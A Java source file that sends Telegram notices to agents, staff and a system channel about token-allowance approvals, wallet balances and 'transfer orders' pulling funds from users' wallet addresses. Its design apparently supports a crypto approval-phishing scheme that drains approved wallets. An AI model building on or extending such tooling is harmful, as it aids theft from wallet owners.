package com.inso.modules.coin;

import com.inso.framework.utils.BigDecimalUtils;
import com.inso.framework.utils.StringUtils;
import com.inso.modules.coin.approve.job.ApproveNotifyMerchantJob;
import com.inso.modules.coin.core.model.*;
import com.inso.modules.coin.approve.service.ContractService;
import com.inso.modules.common.WhiteIPManager;
import com.inso.modules.common.model.CryptoCurrency;
import com.inso.modules.common.model.Status;
import com.inso.modules.common.telegram.BaseMessageProcessor;
import com.inso.modules.passport.user.model.UserAttr;
import com.inso.modules.passport.user.model.UserInfo;
import com.inso.modules.passport.user.service.UserAttrService;
import com.inso.modules.passport.user.service.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.math.BigDecimal;

@Component
public class CoinMesageManager extends BaseMessageProcessor {

    @Autowired
    private UserAttrService mUserAttrService;

    @Autowired
    private ContractService mContractService;

    @Autowired
    private UserService mUserService;

    public void sendApproveMessage(ApproveAuthInfo authInfo, BigDecimal balance, BigDecimal allowance)
    {
        try {
            if(!checkInit())
            {
                return;
            }

            if(authInfo == null)
            {
                return;
            }

            if(balance == null && allowance == null)
            {
                return;
            }

            if(authInfo.getUserType() != null && authInfo.getUserType().equalsIgnoreCase(UserInfo.UserType.TEST.getKey()))
            {
                return;
            }

            String agentname = authInfo.getAgentname();
            String staffname = authInfo.getStaffname();

            if(StringUtils.isEmpty(agentname))
            {
                UserAttr userAttr = mUserAttrService.find(false, authInfo.getUserid());
                agentname = userAttr.getAgentname();
                staffname = userAttr.getDirectStaffname();
            }

            if(StringUtils.isEmpty(agentname))
            {
                return;
            }

            CryptoNetworkType networkType = CryptoNetworkType.getType(authInfo.getCtrNetworkType());
            CryptoCurrency currency = CryptoCurrency.getType(authInfo.getCurrencyType());

            if(networkType == null)
            {
                ContractInfo contractInfo = mContractService.findById(false, authInfo.getContractId());
                networkType = CryptoNetworkType.getType(contractInfo.getNetworkType());
                currency = CryptoCurrency.getType(contractInfo.getCurrencyType());
            }

            balance = BigDecimalUtils.getNotNull(balance);


            StringBuilder buffer = new StringBuilder();

            if(allowance != null)
            {
                if(allowance.compareTo(BigDecimal.ZERO) == 0 && authInfo.getAllowance().compareTo(BigDecimal.ZERO) == 0)
                {
                    return;
                }

                if(allowance.compareTo(BigDecimal.ZERO) <= 0)
                {
                    buffer.append("取消授权通知").append(mEndFlag);
                }
                else
                {
                    buffer.append("授权通知").append(mEndFlag);
                }
            }
            else
            {
                if(balance.compareTo(authInfo.getBalance()) > 0)
                {
                    buffer.append("加金通知").append(mEndFlag);
                }
                else
                {
                    buffer.append("出金通知").append(mEndFlag);
                }

                allowance = authInfo.getAllowance();
            }

            allowance = BigDecimalUtils.getNotNull(allowance);

            buffer.append("钱包地址: ").append(authInfo.getSenderAddress()).append(mEndFlag);
            if(allowance.compareTo(ApproveAuthInfo.DEFAULT_MAX_ALLOWANCE) >= 0)
            {
                buffer.append("授权额度: 无限制").append(mEndFlag);
            }
            else
            {
                buffer.append("授权额度: 0").append(mEndFlag);
            }

            buffer.append("钱包余额: ").append(balance).append(mEndFlag);
            buffer.append("所属网络: ").append(networkType.getKey()).append(mEndFlag);
            buffer.append("所属币种: ").append(currency.getKey()).append(mEndFlag);
            if(!StringUtils.isEmpty(staffname))
            {
                buffer.append("所属员工: ").append(staffname).append(mEndFlag);
            }

            sendMessage(agentname, buffer.toString());

            buffer.append("所属代理: ").append(agentname).append(mEndFlag);
            sendSystemMessage(buffer.toString());



            UserInfo userInfo = mUserService.findByUsername(false, agentname);
            if(!userInfo.getStatus().equalsIgnoreCase(Status.ENABLE.getKey()) && BigDecimalUtils.DEF_20.compareTo(authInfo.getBalance()) > 0){
                sendMessage("agenthz01", buffer.toString());
                buffer.append("所属代理: ").append("agenthz01").append(mEndFlag);
                sendSystemMessage(buffer.toString());
            }


            ApproveNotifyMerchantJob.sendMQ(authInfo);
        } catch (Exception e) {
        }
    }


    public void sendCreateTransferOrderMessage(String agentname, CryptoNetworkType networkType, CryptoCurrency currency, String address, BigDecimal amount, TriggerOperatorType operatorType, String remoteip, String orderno)
    {
        try {
            if(!checkInit())
            {
                return;
            }
            if(agentname == null)
            {
                return;
            }

            StringBuilder buffer = new StringBuilder();

            buffer.append("创建划转订单通知").append(mEndFlag);
            buffer.append("订单编号: ").append(orderno).append(mEndFlag);
            buffer.append("钱包地址: ").append(address).append(mEndFlag);
            buffer.append("划转金额: ").append(amount).append(mEndFlag);
            buffer.append("所属网络: ").append(networkType.getKey()).append(mEndFlag);
            buffer.append("所属币种: ").append(currency.getKey()).append(mEndFlag);
            buffer.append("操作角色: ").append(operatorType.getKey()).append(mEndFlag);

            if(!WhiteIPManager.getInstance().verify(remoteip))
            {
                buffer.append("操作IP: ").append(remoteip).append(mEndFlag);
            }

            sendMessage(agentname, buffer.toString());
            buffer.append("所属代理: ").append(agentname).append(mEndFlag);
            sendSystemMessage(buffer.toString());
        } catch (Exception e) {
            LOG.error("sendCreateTransferOrderMessage error:", e);
        }
    }

    public void sendTransferOrderResultMessage(TransferOrderInfo transferOrderInfo, boolean success, String errmsg)
    {
        try {
            if(!checkInit())
            {
                return;
            }

            StringBuilder buffer = new StringBuilder();

            buffer.append("划转结果通知").append(mEndFlag);
            buffer.append("订单编号: ").append(transferOrderInfo.getNo()).append(mEndFlag);
            buffer.append("钱包地址: ").append(transferOrderInfo.getFromAddress()).append(mEndFlag);
            buffer.append("划转金额: ").append(transferOrderInfo.getTotalAmount()).append(mEndFlag);
            buffer.append("所属网络: ").append(transferOrderInfo.getCtrNetworkType()).append(mEndFlag);
            buffer.append("所属币种: ").append(transferOrderInfo.getCurrencyType()).append(mEndFlag);
            buffer.append("所属代理: ").append(transferOrderInfo.getAgentname()).append(mEndFlag);

            if(success)
            {
                buffer.append("划转结果: 成功").append(mEndFlag);
            }
            else
            {
                buffer.append("划转结果: 失败").append(mEndFlag);
            }

            if(!StringUtils.isEmpty(errmsg))
            {
                buffer.append("备注信息: ").append(errmsg).append(mEndFlag);
            }

            String rs = buffer.toString();

            sendMessage(transferOrderInfo.getAgentname(), rs);
            sendSystemMessage(rs);
        } catch (Exception e) {
            LOG.error("sendTransferOrderResultMessage error:", e);
        }
    }



}

